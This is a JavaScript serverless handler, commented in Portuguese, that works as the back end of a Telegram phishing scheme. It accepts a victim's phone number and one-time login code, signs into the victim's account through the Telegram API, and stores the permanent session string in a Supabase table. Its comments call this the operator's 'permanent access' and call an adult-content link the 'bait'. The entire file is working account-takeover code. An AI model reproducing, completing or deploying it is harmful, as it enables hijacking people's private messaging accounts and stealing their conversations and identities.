import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  const { phoneNumber, code } = req.body;

  // 1. Resgata o estado intermediário do Supabase
  const { data: authData } = await supabase
    .from('auth_state')
    .select('*')
    .eq('phone_number', phoneNumber)
    .single();

  // 2. Recria o cliente com a sessão temporária
  const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, {
    connectionRetries: 5,
  });
  
  await client.connect();

  try {
    // 3. Envia o código digitado pelo usuário
    await client.invoke(
      new Api.auth.SignIn({
        phoneNumber,
        phoneCodeHash: authData.phone_code_hash,
        phoneCode: code,
      })
    );

    // 4. SUCESSO! Salva a sessão definitiva (O seu acesso permanente)
    const finalSession = client.session.save();
    
    await supabase.from('telegram_sessions').upsert({
      phone_number: phoneNumber,
      session_string: finalSession
    });

    // Limpa o estado temporário
    await supabase.from('auth_state').delete().eq('phone_number', phoneNumber);
    
    await client.disconnect();
    
    // Libera a isca digital (redireciona ou envia o link do nicho hot/conteúdo)
    res.status(200).json({ success: true, redirect: "/seu-conteudo-vip" });

  } catch (error) {
    await client.disconnect();
    res.status(400).json({ error: error.message });
  }
}
